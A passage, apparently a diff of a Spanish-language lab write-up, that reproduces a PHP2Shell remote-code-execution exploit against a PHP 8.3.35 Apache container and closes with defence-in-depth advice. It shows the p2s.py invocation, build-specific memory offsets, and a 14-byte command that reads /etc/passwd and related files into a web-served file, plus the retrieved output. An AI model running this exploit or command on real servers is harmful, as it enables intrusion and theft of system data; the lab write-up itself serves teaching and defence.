@@ -543,6 +543,355 @@ El resultado coincide con el comportamiento que RedSideSecurity documenta para P
 
 
 
+#### Explotación de PHP2Shell y recuperación de información del sistema
+
+En la prueba anterior conseguimos confirmar la ejecución remota de comandos (RCE) mediante una técnica basada en la medición del tiempo de respuesta HTTP.
+
+La herramienta `p2s.py` ejecutó una prueba temporal utilizando el comando `sleep 8`, registrando una demora de 8,3 segundos.
+
+Sin embargo, esa prueba no permitió recuperar información del sistema operativo. Únicamente confirmó que era posible ejecutar comandos mediante la vulnerabilidad.
+
+En esta segunda experiencia vamos a utilizar la misma herramienta, pero esta vez permitiremos que ejecute un comando para leer archivos del servidor y recuperar su contenido mediante HTTP.
+
+##### Ejecución de la prueba
+
+Desde el directorio del repositorio original de RedSideSecurity, ejecutamos:
+
+```
+python3 p2s.py -u http://192.168.18.68:8083/
+```
+
+A diferencia de la prueba anterior, no utilizamos el parámetro `--no-poc`.
+
+Esto permite que la herramienta, después de comprobar la ejecución remota mediante una prueba temporal, intente ejecutar un comando adicional para recuperar información del servidor.
+
+**Salida obtenida:**
+
+```
+[1] fingerprint: X-Powered-By: PHP/8.3.35 -> version=8.3.35
+[2] offsets: 2 candidate build(s); htdata swept +-2 page(s)
+[3] try official php:8.3-apache (debian trixie): zif=0x3ac080 dtor=0x49ec50 htdata=0x6a0d8 ... RCE CONFIRMED (delay 8.2s >= 7s)
+[4] running your command -> 'cat /e*/p*>poc'
+
+[+] DONE: RCE confirmed on official php:8.3-apache (debian trixie).
+[+] proof file http://192.168.18.68:8083/poc (HTTP 200):
+----
+# ---------------------------------------------------------------------------#
+# /etc/pam.conf								     #
+# ---------------------------------------------------------------------------#
+#
+# NOTE
+# ----
+#
+# NOTE: Most program use a file under the /etc/pam.d/ directory to setup their
+# PAM service modules. This file is used only if that directory does not exist.
+# ---------------------------------------------------------------------------#
+
+# Format:
+# serv.	module	   ctrl	      module [path]	...[args..]		     #
+# name	type	   flag							     #
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "$(id -u)" -eq 0 ]; then
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+else
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+fi
+export PATH
+
+if [ "${PS1-}" ]; then
+  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1='\h:\w\$ '
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ "$(id -u)" -eq 0 ]; then
+      PS1='# '
+    else
+      PS1='$ '
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in $(run-parts --list --regex '^[a-zA-Z0-9_][a-zA-Z0-9._-]*\.sh$' /etc/profile.d); do
+    if [ -r $i ]; then
+      . $i
+    fi
+  done
+  unset i
+fi
+----
+    offsets: --zif-offset 0x3ac080 --dtor-offset 0x49ec50 --htdata-offset 0x6a0d8
+```
+
+##### ¿Cómo funciona técnicamente esta prueba?
+
+**Identificación del intérprete PHP**
+
+La primera operación consiste en identificar la versión del intérprete utilizado por el servidor.
+
+```
+[1] fingerprint: X-Powered-By: PHP/8.3.35 -> version=8.3.35
+```
+
+La herramienta obtiene esta información mediante la cabecera HTTP `X-Powered-By`.
+
+En este caso, identifica PHP 8.3.35, una versión anterior a la corrección de las vulnerabilidades estudiadas.
+
+**Selección de offsets de memoria**
+
+La segunda etapa consiste en seleccionar los desplazamientos de memoria necesarios para intentar la explotación.
+
+```
+[2] offsets: 2 candidate build(s); htdata swept +-2 page(s)
+```
+
+La herramienta identifica dos compilaciones candidatas y prepara un barrido de valores para `htdata`.
+
+La combinación que finalmente permite completar el procedimiento es:
+
+```
+zif=0x3ac080
+dtor=0x49ec50
+htdata=0x6a0d8
+```
+
+Estos valores corresponden a la compilación oficial de PHP 8.3 sobre Debian Trixie registrada por RedSideSecurity.
+
+**Confirmación de ejecución remota de comandos**
+
+Antes de intentar recuperar información, la herramienta comprueba nuevamente que puede ejecutar comandos mediante la vulnerabilidad.
+
+```
+[3] try official php:8.3-apache (debian trixie): zif=0x3ac080 dtor=0x49ec50 htdata=0x6a0d8 ... RCE CONFIRMED (delay 8.2s >= 7s)
+```
+
+La herramienta registra una demora de 8,2 segundos y la compara con su umbral de confirmación de 7 segundos.
+
+El resultado es compatible con la ejecución del comando `sleep 8`, utilizado para realizar la comprobación temporal.
+
+Hasta este punto, el procedimiento es equivalente al realizado en la experiencia anterior.
+
+La diferencia aparece en la siguiente etapa, cuando la herramienta intenta ejecutar un comando cuyo resultado pueda recuperarse.
+
+**Ejecución del comando para leer archivos**
+
+Una vez confirmada la ejecución remota, la herramienta informa:
+
+```
+[4] running your command -> 'cat /e*/p*>poc'
+```
+
+El comando utilizado es:
+
+```
+cat /e*/p*>poc
+```
+
+Podemos dividirlo en tres componentes:
+
+- `cat`: permite leer el contenido de uno o varios archivos y enviarlo a la salida estándar.
+- `/e*/p*`: utiliza comodines del intérprete de comandos para seleccionar archivos cuyos nombres coincidan con ese patrón.
+- `>poc`: redirige la salida estándar hacia un archivo denominado `poc`.
+
+El patrón `/e*/p*` permite acceder a archivos del directorio `/etc` cuyos nombres comienzan con la letra `p`.
+
+En nuestro laboratorio, la salida obtenida contiene información procedente de tres archivos:
+
+```
+/etc/pam.conf
+/etc/passwd
+/etc/profile
+```
+
+¿Por qué se utilizan comodines en lugar de escribir directamente las rutas?
+
+La técnica de explotación implementada por RedSideSecurity tiene una limitación en la cantidad de bytes disponibles para introducir el comando.
+
+Según la documentación oficial, el espacio disponible es de **14 bytes**.
+
+El comando:
+
+```
+cat /e*/p*>poc
+```
+
+ocupa exactamente 14 bytes.
+
+Los comodines permiten abreviar las rutas y aprovechar ese espacio limitado para acceder a varios archivos del sistema operativo.
+
+Además, la redirección `>poc` hace que el resultado se almacene en un archivo dentro del directorio de trabajo del proceso PHP.
+
+**Recuperación de información del sistema operativo**
+
+La salida obtenida demuestra que el comando consiguió leer información de distintos archivos.
+
+El primer bloque corresponde a `/etc/pam.conf`, un archivo relacionado con la configuración del sistema de autenticación PAM de GNU/Linux.
+
+```
+# /etc/pam.conf
+#
+# NOTE: Most program use a file under the /etc/pam.d/ directory to setup their
+# PAM service modules. This file is used only if that directory does not exist.
+```
+
+A continuación, aparecen entradas correspondientes a `/etc/passwd`:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+Este archivo contiene información sobre las cuentas locales del sistema operativo.
+
+Cada entrada incluye campos como el nombre de usuario, el identificador de usuario (UID), el identificador de grupo (GID), el directorio personal y el intérprete de comandos asignado.
+
+Por ejemplo:
+
+```
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+La entrada identifica al usuario `www-data`, habitualmente utilizado por Apache en sistemas Debian.
+
+Finalmente, encontramos contenido correspondiente a `/etc/profile`:
+
+```
+if [ "$(id -u)" -eq 0 ]; then
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+else
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+fi
+export PATH
+```
+
+Este archivo establece parte de la configuración del entorno de ejecución de las sesiones de shell, como la variable `PATH`.
+
+La recuperación de estos contenidos demuestra que el comando pudo acceder a archivos del sistema operativo desde el contexto del proceso PHP comprometido.
+
+**Recuperación del archivo mediante HTTP**
+
+Después de ejecutar el comando, la herramienta informa:
+
+```
+[+] DONE: RCE confirmed on official php:8.3-apache (debian trixie).
+[+] proof file http://192.168.18.68:8083/poc (HTTP 200):
+```
+
+El archivo `poc` se genera en el directorio de trabajo del proceso PHP, que en este laboratorio corresponde al directorio web servido por Apache.
+
+La herramienta realiza una solicitud HTTP para recuperar su contenido.
+
+El código de respuesta `200` indica que el servidor respondió satisfactoriamente y permitió acceder al archivo.
+
+Esto demuestra que podemos obtener información del sistema comprometido mediante el propio servidor HTTP, sin utilizar una conexión SSH ni compartir directorios entre el contenedor y el sistema anfitrión.
+
+##### Recuperación manual del archivo utilizando curl
+
+También podemos recuperar el archivo generado utilizando `curl`.
+
+Para consultar su contenido directamente desde la terminal:
+
+```
+curl http://192.168.18.68:8083/poc
+```
+
+La respuesta debería contener la misma información que recuperó anteriormente `p2s.py`.
+
+Si queremos descargar el archivo y conservar una copia local:
+
+```
+curl -o poc http://192.168.18.68:8083/poc
+```
+
+El parámetro `-o` permite especificar el nombre del archivo donde se guardará la respuesta HTTP.
+
+En este caso, se crea un archivo llamado `poc` dentro del directorio desde el cual ejecutamos `curl`.
+
+Posteriormente, podemos consultar su contenido:
+
+```
+cat poc
+```
+
+Es importante distinguir que esta operación no vuelve a explotar la vulnerabilidad.
+
+`curl` simplemente realiza una solicitud HTTP para descargar un archivo que ya fue generado mediante la ejecución remota de comandos.
+
+##### Interpretación de los resultados
+
+La experiencia permite identificar dos resultados diferentes.
+
+**Confirmación de ejecución remota**
+
+```
+RCE CONFIRMED (delay 8.2s >= 7s)
+```
+
+La herramienta consiguió reproducir la prueba temporal utilizando los offsets correspondientes a la compilación del servidor.
+
+**Ejecución de un comando con recuperación de resultados**
+
+```
+[4] running your command -> 'cat /e*/p*>poc'
+```
+
+El comando permitió generar un archivo con contenido procedente de `/etc/pam.conf`, `/etc/passwd` y `/etc/profile`.
+
+Posteriormente, la herramienta recuperó ese archivo mediante una solicitud HTTP satisfactoria:
+
+```
+[+] proof file http://192.168.18.68:8083/poc (HTTP 200):
+```
+
+La combinación de estos resultados constituye una evidencia más directa de explotación que la prueba temporal anterior.
+
+Ya no dependemos exclusivamente de observar una demora en el servidor. Ahora disponemos de información que fue obtenida mediante un comando ejecutado en el sistema vulnerable y recuperada a través de la red.
+
+Sin embargo, esto no significa que hayamos conseguido privilegios de administrador.
+
+La ejecución se produce con los permisos del proceso PHP comprometido. En nuestro laboratorio, Apache utiliza el usuario de servicio `www-data`.
+
+##### Conclusión de la prueba
+
+Esta segunda experiencia permitió avanzar desde la confirmación temporal de ejecución remota hasta una demostración de ejecución de comandos con recuperación de información.
+
+La herramienta `p2s.py` identificó PHP 8.3.35, seleccionó los offsets correspondientes a la compilación utilizada y confirmó nuevamente la RCE mediante una demora de 8,2 segundos.
+
+Posteriormente, ejecutó el comando `cat /e*/p*>poc`, que permitió leer archivos del sistema operativo y guardar su contenido en un archivo accesible mediante HTTP.
+
+Finalmente, comprobamos que ese mismo archivo puede recuperarse utilizando `curl`, sin necesidad de acceder directamente al sistema de archivos del contenedor.
+
+**La prueba demuestra que la vulnerabilidad no solamente permite alterar el comportamiento del intérprete PHP, sino también ejecutar comandos capaces de acceder a información del sistema operativo y devolver sus resultados mediante el servidor web comprometido.**
+
+
+
+
+
 
 
 ## Laboratorio con WordPress y PHP 8.3.33
@@ -664,3 +1013,169 @@ Las pruebas realizadas no permitieron confirmar RCE. Las siguientes son **hipót
 7. **Comparar contra un objetivo conocido del laboratorio original.** Ejecutar las mismas pruebas en una de las compilaciones donde el autor informa RCE permitiría separar un problema de las herramientas de uno específico del despliegue de WordPress.
 
 **Criterio para avanzar:** registrar cada cambio por separado y comprobar si modifica la clasificación del escáner, la fase de filtración de memoria o la confirmación de ejecución. No considerar explotado el sistema hasta contar con una prueba reproducible de RCE.
+
+## Consideraciones finales: condiciones de explotación y seguridad preventiva
+
+A lo largo de este laboratorio conseguimos identificar una versión vulnerable de PHP, reproducir un comportamiento anómalo durante el procesamiento de solicitudes HTTP y demostrar que, bajo determinadas condiciones, es posible ejecutar comandos del sistema operativo y recuperar información del servidor.
+
+Sin embargo, **utilizar una versión vulnerable de PHP no significa necesariamente que cualquier intento de explotación vaya a funcionar**.
+
+Como observamos durante las pruebas, conseguir ejecución remota de comandos requiere que se cumplan determinadas condiciones técnicas.
+
+##### Condiciones necesarias para reproducir la explotación
+
+En el caso de PHP2Shell y de las herramientas utilizadas en este laboratorio, podemos identificar varios factores relevantes:
+
+1. **Versión vulnerable de PHP.** El servidor debe utilizar una compilación afectada por las vulnerabilidades estudiadas, sin las correcciones correspondientes. También debemos considerar que algunas distribuciones incorporan parches de seguridad sin modificar necesariamente el número principal de versión.
+2. **Interfaz de ejecución de PHP (SAPI).** El laboratorio utiliza Apache con `mod_php` y el módulo de multiprocesamiento `prefork`. Esta combinación corresponde a uno de los escenarios donde los autores de la herramienta consiguieron demostrar la ejecución remota de comandos. Otras formas de ejecutar PHP pueden presentar comportamientos diferentes.
+3. **Configuración del intérprete.** Parámetros como `memory_limit`, `post_max_size`, `max_input_vars` y `session.upload_progress.enabled` influyen sobre el procesamiento de las solicitudes HTTP y las condiciones que permiten activar las vulnerabilidades.
+4. **Disposición de la memoria.** La explotación necesita que determinadas estructuras internas de PHP ocupen posiciones apropiadas en memoria. Para facilitar su reproducción, el laboratorio configura Apache con un único proceso trabajador, reduciendo las variaciones que podrían introducir las solicitudes concurrentes.
+5. **Offsets correspondientes a la compilación.** La herramienta necesita identificar desplazamientos de memoria asociados a determinadas funciones y estructuras internas. Estos valores dependen de la compilación concreta de PHP, de sus bibliotecas y del entorno utilizado. No necesariamente son iguales entre dos servidores que anuncian la misma versión de PHP.
+6. **Superación de las protecciones de memoria.** Mecanismos como ASLR introducen aleatoriedad en las direcciones de memoria. La técnica utilizada necesita obtener información que permita localizar las estructuras necesarias durante la ejecución.
+7. **Acceso al procesamiento de solicitudes HTTP.** El atacante debe poder enviar solicitudes que alcancen el código vulnerable del intérprete. Las restricciones del servidor web, los límites de tamaño de las peticiones y otros controles pueden impedir que determinadas solicitudes lleguen a procesarse.
+
+Estas condiciones permiten comprender por qué existe una diferencia importante entre **identificar una versión vulnerable, provocar un fallo de memoria y conseguir ejecutar comandos remotamente**.
+
+##### Una misma versión de PHP no garantiza el mismo resultado
+
+El laboratorio original de RedSideSecurity proporciona entornos preparados con distintas versiones de PHP y documenta resultados exitosos de ejecución remota en determinadas compilaciones.
+
+En nuestra primera experiencia utilizamos PHP 8.3.35 sobre Apache, reproduciendo una configuración similar a la propuesta por los autores.
+
+En ese escenario conseguimos confirmar la ejecución remota y recuperar información del sistema operativo.
+
+Sin embargo, también realizamos una experiencia independiente utilizando una imagen oficial de WordPress con PHP 8.3.33.
+
+Esta versión es anterior a PHP 8.3.36, donde se incorporaron las correcciones correspondientes a la rama 8.3.
+
+Durante esa prueba, el escáner identificó una versión potencialmente vulnerable, pero no consiguió observar el comportamiento de memoria utilizado como señal de detección.
+
+Posteriormente, intentamos verificar la ejecución remota utilizando `p2s.py`, sin obtener un resultado satisfactorio.
+
+La herramienta devolvió repetidamente:
+
+```
+leak failed
+```
+
+Finalmente, informó que no había conseguido confirmar la explotación mediante ninguna de las combinaciones ensayadas.
+
+Este resultado es particularmente interesante porque demuestra que **la presencia de una versión potencialmente vulnerable no garantiza que una técnica de explotación determinada funcione en cualquier implementación**.
+
+Las imágenes utilizadas por WordPress pueden incorporar compilaciones de PHP diferentes de las empleadas en el laboratorio original. También pueden existir diferencias en la configuración de Apache, en la distribución de memoria y en las bibliotecas utilizadas.
+
+No hemos determinado todavía cuál de estos factores explica el resultado obtenido con WordPress.
+
+Por lo tanto, no podemos afirmar que esa implementación sea segura ni que la vulnerabilidad no pueda explotarse. Solamente podemos establecer que **la primera prueba realizada no consiguió demostrar ejecución remota de comandos**.
+
+Esta distinción es fundamental al interpretar resultados de herramientas de seguridad.
+
+##### La actualización es necesaria, pero no suficiente
+
+La principal medida para corregir PHP2Shell consiste en actualizar PHP a una versión que incorpore los parches de seguridad.
+
+Sin embargo, mantener el software actualizado no debería ser la única medida de protección de un servidor.
+
+Un sistema seguro debe contemplar mecanismos preventivos que reduzcan tanto la posibilidad de explotación como sus consecuencias si alguna vulnerabilidad llega a aprovecharse.
+
+Este enfoque se conoce como **defensa en profundidad**: utilizar diferentes controles de seguridad para evitar que el fallo de uno de ellos comprometa completamente el sistema.
+
+Podemos identificar algunas medidas especialmente relevantes para el escenario estudiado.
+
+**Ejecución de servicios con privilegios mínimos**
+
+El proceso que ejecuta PHP no debería disponer de más privilegios de los estrictamente necesarios para realizar su trabajo.
+
+En nuestro laboratorio, Apache utiliza el usuario `www-data`.
+
+Durante la explotación conseguimos ejecutar comandos dentro del contexto del proceso PHP, pero eso no significa que hayamos obtenido permisos de administrador.
+
+Si el proceso comprometido se ejecutara con privilegios de `root`, las consecuencias potenciales serían considerablemente mayores.
+
+Por este motivo, los servicios deben utilizar cuentas específicas, sin privilegios administrativos y con acceso limitado a los recursos que necesitan.
+
+**Control de permisos sobre archivos y directorios**
+
+La ejecución de comandos no implica necesariamente que el atacante pueda acceder a todos los archivos del sistema.
+
+Los mecanismos de permisos de GNU/Linux permiten establecer qué usuarios pueden leer, modificar o ejecutar determinados archivos.
+
+Por ejemplo, podemos restringir el acceso a archivos que contengan credenciales de aplicaciones, claves privadas, configuraciones sensibles o información que no necesita utilizar el proceso PHP.
+
+Durante nuestra prueba conseguimos recuperar `/etc/passwd`, un archivo que normalmente permite lectura a usuarios sin privilegios.
+
+En cambio, archivos como `/etc/shadow` suelen estar protegidos mediante permisos más restrictivos.
+
+La correcta administración de usuarios, grupos y permisos puede limitar considerablemente la información accesible después de una explotación.
+
+También es importante evitar que el proceso PHP tenga permisos de escritura sobre archivos ejecutables o directorios donde no necesita modificar contenido.
+
+**Aislamiento mediante contenedores**
+
+Otro aspecto importante es que nuestro laboratorio se ejecuta dentro de contenedores Docker.
+
+Esto introduce una separación entre el entorno donde se ejecuta PHP y el sistema operativo anfitrión.
+
+Durante la explotación conseguimos leer archivos del sistema de archivos del contenedor, pero eso no significa que hayamos obtenido automáticamente acceso al sistema anfitrión.
+
+El aislamiento mediante espacios de nombres (*namespaces*), el control de recursos mediante *cgroups* y las restricciones de capacidades de Linux pueden limitar el alcance de un proceso comprometido.
+
+Sin embargo, **utilizar contenedores no constituye por sí mismo una garantía de seguridad**.
+
+El nivel de aislamiento depende de cómo estén configurados.
+
+Un contenedor ejecutado con privilegios elevados, con acceso a dispositivos sensibles, al socket de Docker o con directorios críticos del anfitrión montados puede ofrecer una superficie de ataque considerablemente mayor.
+
+Por lo tanto, es importante ejecutar contenedores sin privilegios innecesarios, restringir sus capacidades y evitar compartir recursos del anfitrión cuando no sea necesario.
+
+**Restricciones adicionales sobre los procesos**
+
+GNU/Linux proporciona mecanismos como AppArmor y SELinux, que permiten establecer políticas adicionales de control de acceso.
+
+Estas herramientas pueden restringir las operaciones que un proceso está autorizado a realizar, incluso cuando los permisos tradicionales del sistema de archivos permitirían determinadas acciones.
+
+También pueden utilizarse mecanismos como seccomp para limitar las llamadas al sistema disponibles para los procesos.
+
+Estos controles no eliminan una vulnerabilidad presente en PHP, pero pueden dificultar determinadas acciones posteriores a su explotación.
+
+**Restricciones de red y exposición de servicios**
+
+Un proceso comprometido también puede intentar comunicarse con otros sistemas.
+
+Por ese motivo, resulta conveniente limitar las conexiones de red permitidas para cada servicio.
+
+Una aplicación PHP que solamente necesita comunicarse con una base de datos específica no debería disponer necesariamente de acceso irrestricto a otros servicios internos o externos.
+
+Las políticas de red y los mecanismos de segmentación pueden reducir las posibilidades de movimiento lateral y de extracción de información.
+
+Del mismo modo, los servidores deberían publicar únicamente los puertos y servicios necesarios.
+
+**Supervisión y registro de actividad**
+
+Los mecanismos preventivos deben complementarse con herramientas de observabilidad y detección.
+
+Los registros del servidor web, los errores del intérprete PHP, el comportamiento de los procesos y el consumo de recursos pueden aportar información relevante para investigar intentos de explotación.
+
+En el caso de PHP2Shell, las solicitudes HTTP especialmente construidas, los errores de agotamiento de memoria y las finalizaciones inesperadas de procesos pueden constituir señales de interés.
+
+No obstante, estos comportamientos no demuestran por sí mismos que haya ocurrido una explotación exitosa.
+
+Su interpretación requiere correlacionar diferentes fuentes de información.
+
+##### Conclusión general del laboratorio
+
+PHP2Shell nos permitió estudiar un escenario en el que una vulnerabilidad presente en el propio intérprete puede comprometer una aplicación web, incluso cuando el problema no se encuentra en el código desarrollado por sus responsables.
+
+También comprobamos que la explotación de vulnerabilidades de memoria es un procedimiento que depende de numerosas condiciones técnicas.
+
+La experiencia con PHP 8.3.35 permitió reproducir una ejecución remota de comandos y recuperar información del sistema operativo. En cambio, la primera experiencia con WordPress y PHP 8.3.33 no consiguió confirmar la explotación, a pesar de utilizar una versión anterior a la corregida.
+
+Estos resultados muestran la importancia de analizar cada implementación concreta y evitar conclusiones basadas exclusivamente en los números de versión o en el resultado de una única herramienta.
+
+Finalmente, el laboratorio permite comprender que **la seguridad no depende solamente de impedir que una vulnerabilidad exista, sino también de limitar sus consecuencias cuando llega a explotarse**.
+
+Actualizar el software corrige vulnerabilidades conocidas, pero aplicar privilegios mínimos, administrar correctamente los permisos, aislar los servicios, restringir las comunicaciones y supervisar su funcionamiento proporciona barreras adicionales.
+
+En nuestro experimento conseguimos ejecutar comandos y recuperar información del contenedor, pero no demostramos acceso privilegiado ni compromiso del sistema anfitrión.
+
+Esa diferencia ilustra uno de los principios más importantes de la seguridad de sistemas: **una vulnerabilidad puede permitir comprometer un componente sin que necesariamente implique el compromiso completo de toda la infraestructura**.
